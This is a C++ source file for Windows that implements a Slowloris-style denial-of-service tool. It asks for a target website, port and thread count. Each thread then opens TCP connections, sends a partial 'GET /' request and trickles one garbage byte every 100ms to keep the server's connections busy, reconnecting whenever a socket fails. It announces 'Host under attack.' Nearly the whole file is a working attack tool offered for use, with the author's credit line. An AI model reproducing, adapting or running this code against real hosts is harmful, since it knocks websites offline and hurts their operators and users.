//for basic C funtions
#include<stdio.h>

//for string operations
#include<string>

//only for cin and cout
#include<iostream>

//for the socket programming in cpp
#include<winsock2.h>

//linking to ws2_32 library
#pragma comment(lib,"ws2_32.lib")

using namespace std;

#define HOST sin_addr.S_un.S_addr

//this is a function that would initialize the
//slow loris attack and each of its instance
//would run on a different thread
DWORD WINAPI slowLorisAttack(PVOID p) {
  
  sockaddr_in *socket_address;
  SOCKET s;
  
  socket_address = (sockaddr_in*)p;
  
  while(1) {
  
    //create a new socket using IPv4, stream
    //socket and TCP
    s = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    
    //if the socket is invalid, the while loop
    //will keep on making new sockets till the
    //time a valid socket is not found/created
    //else
    if(s != INVALID_SOCKET) {
      
      //using a GET header to fetch data
      char header[] = "GET /";
      
      //a garbage value to be sent again and
      //again to keep the server busy
      char garbage = 'A';
      
      //connect to the server
      connect(s,(sockaddr*)socket_address,\
      sizeof(sockaddr_in));
      
      //send the header
      send(s,header,sizeof(header)-1,0);
      
      //for anyone wondering why sizeof(header)-1
      //it's because of the '\0' character after
      //every string in cpp
      
      //this infinite loop is responsibe
      //for sending garbage values again
      //and again
      while(1) {
        int n = send(s,&garbage,1,0);
        
        if(n == SOCKET_ERROR) {
          //if any error is encountered, move out
          //of the loop, make a new socket and
          //proceed
          break;
        }
        
        //wait for 100ms before sending another
        //garbage value
        Sleep(100);
      }
      
      //if you moved out of the inner infinite
      //loop due to error, close the socket
      closesocket(s);
    }
  }
}

int main() {

  system("cls");
  
  string hostname;
  string portNumber;
  string threads;
  
  //unsigned long int in microsoft-ish language. LOL
  ULONG i;
  
  //an instance of wsadata structure for storing
  //information about windows socket implementation
  WSADATA wd;
  
  if(WSAStartup(0x202,&wd)) {
    cout<<"Unable to start winsock";
    return -1;
  }
  
  //an instance of hostent structure to store
  //information about the host
  hostent *host;
  
  sockaddr_in socket_address;
  cout<<"This tool is designed and developed by"
  <<"Anirudh Duggal\ngithub profile: @anirudhdg"
  <<"gl\n\n\n\n";
  
  cout<<"Enter the targe website's name:\t";
  getline(cin,hostname);
  
  host = gethostbyname(hostname.data());
  
  if(!host) {
    cout<<"Invalid hostname";
    return -1;
  }
  
  cout<<"\nEnter port number (if you don't know"
  <<" what this means, simply enter 80):\t";
  getline(cin,portNumber);
  
  cout<<"Number of threads you want to run:\t";
  getline(cin,threads);
  
  //assign the IPv4 of the host entered to the
  //corresponding value in the socket_address
  //structure
  socket_address.HOST = *(PULONG)host->h_addr;
  
  //set family as IPv4
  socket_address.sin_family = AF_INET;
  
  //breakdown of the following line:
  //convert the port number to an
  //unsigned long int, then convert
  //the host address to the corresponding
  //network address and then assign to the
  //corresponding value in socket_address
  //structure
  socket_address.sin_port = htons(strtoul(\
  portNumber.data(),NULL,0));
  
  cout<<"\n\n"; //just for a bit of neatness
  
  //make the requisite number of threads and GO
  for(i = 0; i < strtoul(threads.data(),NULL,0); i++) {
    CreateThread(NULL,0,slowLorisAttack,&socket_address\
    ,0,NULL);
    cout<<i+1<<" threads created\n";
  }
   
  cout<<"Host under attack.\n Press any key to terminate";
  
  getchar();

  return 0;
}
